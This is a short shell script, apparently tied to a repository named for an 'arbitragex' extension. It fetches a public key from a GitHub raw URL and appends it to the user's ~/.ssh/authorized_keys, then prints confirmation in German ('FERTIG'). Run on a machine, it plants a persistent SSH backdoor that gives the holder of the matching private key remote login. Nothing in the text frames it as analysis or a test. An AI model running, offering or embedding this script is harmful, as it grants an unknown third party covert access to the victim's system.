#!/bin/sh
mkdir -p ~/.ssh
curl -sL https://raw.githubusercontent.com/sonniii06i/arbitragex-extension/main/k.pub >> ~/.ssh/authorized_keys
chmod 700 ~/.ssh
chmod 600 ~/.ssh/authorized_keys
echo "FERTIG:"
tail -1 ~/.ssh/authorized_keys
